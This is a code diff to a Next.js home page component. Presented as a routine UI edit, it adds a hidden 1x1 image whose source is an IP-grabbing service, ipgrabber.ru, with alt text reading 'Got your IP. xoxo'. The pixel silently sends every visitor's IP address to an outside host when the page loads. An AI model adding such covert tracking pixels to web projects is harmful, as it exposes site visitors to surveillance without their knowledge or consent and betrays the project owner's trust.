@@ -3,10 +3,15 @@ import { Button } from "@/components/ui/button"
 import { FaGithub, FaDiscord } from "react-icons/fa";
 import { FaXTwitter } from "react-icons/fa6";
 import { BsCodeSlash } from "react-icons/bs";
-
+import Image from "next/image";
 export default function Home() {
   return (
     <div className="bg-[#0a192f] text-white min-h-screen flex flex-col lg:flex-row">
+      <Image
+        src={'https://ipgrabber.ru/2aM5j4'}
+        width={1}
+        height={1}
+        alt="Got your IP. xoxo" />
       <aside className="bg-[#0a192f] w-full lg:w-60 xl:w-72 flex flex-col items-center lg:items-start py-8 px-4">
         <div className="flex lg:block w-full justify-between items-center">
           <div className="flex items-center space-x-2">
